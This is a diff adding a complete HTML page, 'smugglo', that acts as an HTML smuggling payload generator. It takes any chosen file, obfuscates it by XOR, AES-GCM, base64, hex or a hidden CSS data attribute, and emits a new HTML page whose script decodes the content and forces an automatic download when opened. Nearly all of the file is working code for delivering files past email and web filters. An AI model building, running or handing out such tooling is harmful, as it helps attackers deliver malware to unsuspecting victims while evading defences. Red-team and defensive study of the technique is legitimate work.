@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>smugglo - HTML File Wrapper</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
+        input, select, button { padding: 8px; margin: 5px 0; }
+        .container { max-width: 400px; margin: auto; }
+        h2 { margin-bottom: 20px; }
+        .inline-group { display: flex; align-items: center; justify-content: space-between; }
+        .inline-group label { flex: 0 0 40px; text-align: left; }
+        .inline-group input { flex: 1; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>smugglo - HTML Payload Generator</h2>
+        <div class="inline-group">
+            <label for="fileInput">File:</label>
+            <input type="file" id="fileInput">
+        </div>
+        <label for="method">Select encoder/encrypter:</label>
+        <select id="method">
+            <option value="css">Hide in CSS</option>
+            <option value="xor">Encrypt with XOR</option>
+            <option value="aes">Encrypt with AES</option>
+            <option value="base64">Encode with Base64</option>
+            <option value="hex">Encode with Hex</option>
+        </select>
+        <button onclick="generateHTML()">Generate HTML Payload</button>
+        <p id="status"></p>
+        <p>Credits: <a href="https://github.com/b3rito/" target="_blank">b3rito @ mes3hacklab & GioPpeTto</a></p>
+    </div>
+
+<script>
+const randomKey=(l=16)=>[...Array(l)].map(()=>'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(Math.random()*62))).join('');
+const toHex=str=>[...str].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+const xorEnc=(d,k)=>btoa([...d].map((c,i)=>String.fromCharCode(c.charCodeAt(0)^k.charCodeAt(i%k.length))).join(''));
+const xorDec=(d,k)=>atob(d).split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^k.charCodeAt(i%k.length))).join('');
+
+async function aesEnc(data,key){
+    const enc=new TextEncoder(),iv=crypto.getRandomValues(new Uint8Array(12));
+    const k=await crypto.subtle.importKey('raw',enc.encode(key),{name:'AES-GCM'},false,['encrypt']);
+    const e=await crypto.subtle.encrypt({name:'AES-GCM',iv},k,enc.encode(data));
+    return btoa(String.fromCharCode(...iv,...new Uint8Array(e)));
+}
+
+async function aesDec(data,key){
+    const raw=atob(data),iv=new Uint8Array([...raw.slice(0,12)].map(c=>c.charCodeAt(0))),encData=new Uint8Array([...raw.slice(12)].map(c=>c.charCodeAt(0)));
+    const k=await crypto.subtle.importKey('raw',new TextEncoder().encode(key),{name:'AES-GCM'},false,['decrypt']);
+    const dec=await crypto.subtle.decrypt({name:'AES-GCM',iv},k,encData);
+    return new TextDecoder().decode(dec);
+}
+
+async function generateHTML(){
+    const file=document.getElementById('fileInput').files[0];
+    const method=document.getElementById('method').value;
+    const key=randomKey();
+
+    if(!file){document.getElementById('status').innerText="Please select a file first.";return;}
+
+    const reader=new FileReader();
+    reader.onload=async()=>{
+        let data=reader.result;
+        if(method==='aes')data=await aesEnc(data,key);
+        if(method==='xor')data=xorEnc(data,key);
+        if(method==='hex')data=toHex(data);
+        if(method==='base64')data=btoa(data);
+        if(method==='css')data=`<div id="data" data-file="${btoa(data)}"></div>`;
+
+        const escapedData=data.replace(/\\/g,'\\\\').replace(/'/g,'\\\'').replace(/\"/g,'\\"');
+        const genHTML=`<!DOCTYPE html><html><body>${data}<script>
+(async()=>{
+let d="${escapedData}";
+${method==='aes'?`d=await(${aesDec.toString()})(d,"${key}");`:''}
+${method==='xor'?`d=(${xorDec.toString()})(d,"${key}");`:''}
+${method==='hex'?`d=decodeURIComponent(d.replace(/(..)/g,'%$1'));`:''}
+${method==='base64'?`d=atob(d);`:''}
+${method==='css'?`d=atob(document.getElementById('data').dataset.file);`:''}
+const l=document.createElement('a');l.href=d;l.download='${file.name}';document.body.appendChild(l);l.click();l.remove();})();<\/script></body></html>`;
+
+        const blob=new Blob([genHTML],{type:'text/html'});
+        const link=document.createElement('a');
+        link.href=URL.createObjectURL(blob);
+        link.download=`smugglo_${file.name}.html`;
+        link.click();
+        document.getElementById('status').innerText='HTML payload generated successfully.';
+    };
+    reader.readAsDataURL(file);
+}
+</script>
+</body>
+</html>
